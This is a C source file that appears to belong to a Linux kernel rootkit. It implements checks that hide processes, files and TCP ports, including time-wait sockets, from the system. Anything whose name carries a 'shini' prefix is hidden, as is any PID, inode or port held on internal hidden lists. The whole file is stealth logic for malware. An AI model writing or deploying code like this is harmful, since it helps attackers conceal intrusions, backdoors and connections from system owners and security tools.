#include <linux/fs.h>
#include <linux/string.h>

#include <net/inet_sock.h>

/* include */
#include "config.h"
#include "hidden_entity.h"

/* logic */
#include "hidden.h"
#include "list_hidden.h"

static bool _hidden_name(const char *name)
{
        if (strstr(name, SHINI_PREFIX) != NULL)
                return true;

        return false;
}

bool hidden_proc(unsigned long pid, const char *name)
{
        hidden_t      *hidden_proc;
        list_hidden_t *list_head = (list_hidden_t *)list_hidden_get_head(LIST_HPROC);

        // hidden with shini prefix
        if (_hidden_name(name))
                return true;

        // hidden by pid
        list_for_each_entry(hidden_proc, list_head, list)
                if (hidden_proc->value == pid)
                        return true;

        return false;
}

bool hidden_file(u64 ino, const char *name)
{
        hidden_t      *hidden_file;
        list_hidden_t *list_head = (list_hidden_t *)list_hidden_get_head(LIST_HFILE);

        // hidden with shini prefix
        if (_hidden_name(name))
                return true;

        // hidden by ino number
        list_for_each_entry(hidden_file, list_head, list)
                if (hidden_file->value == ino)
                        return true;

        return false;
}

bool hidden_port(unsigned short port, const list_hidden_e list_hidden)
{
        hidden_t      *hidden_port;
        list_hidden_t *list_head = (list_hidden_t *)list_hidden_get_head(list_hidden);

        list_for_each_entry(hidden_port, list_head, list)
                if (hidden_port->value == port)
                        return true;
        return false;
}

// lh_s = list_hidden_src
// lh_d = list_hidden_dest
bool hidden_tcp_port(struct sock *sp,
                     const list_hidden_e lh_s,
                     const list_hidden_e lh_d)
{
        // dest and source ports
        unsigned short d,
                       s;

        // inet
        struct inet_sock *inet = (struct inet_sock *)sp;

        // get ports values
        d = ntohs(inet->inet_dport);
        s = ntohs(inet->inet_sport);

        // check hidden ports
        if (hidden_port(s, lh_s) || hidden_port(d, lh_d))
                return true;

        return false;
}

bool hidden_tcp_timewait(struct inet_timewait_sock *tw,
                         const list_hidden_e lh_s,
                         const list_hidden_e lh_d)
{
        // dest and source ports
        unsigned short d = ntohs(tw->tw_dport),
                       s = ntohs(tw->tw_sport);

        // hidden port?
        if (hidden_port(s, lh_s) || hidden_port(d, lh_d))
                return true;

        return false;
}

